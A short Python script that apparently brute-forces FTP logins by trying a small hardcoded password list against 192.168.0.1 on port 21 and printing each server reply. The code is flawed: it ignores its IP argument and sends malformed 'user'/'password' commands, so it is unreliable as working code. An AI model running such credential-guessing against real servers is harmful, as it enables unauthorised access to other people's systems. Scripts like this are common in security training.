#!/usr/bin/python

import socket
import re
import sys

def connection(ip,user,passw):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	
	print("Trying " + ip + " with username: " + user + " and password: " + passw)

	s.connect(('192.168.0.1',21))
	
	data = s.recv(1024)

	s.send('user' + user + '\r\n')

	data = s.recv(1024)

	s.send('password' + passw + '\r\n')

	data = s.recv(1024)

	s.send('QUIT')

	s.close()

	return data

user = 'user1'
password = ['pass1', 'pass2', 'pass3', 'pass4']

for password in password:
	print(connection('192.168.0.1',user,password))
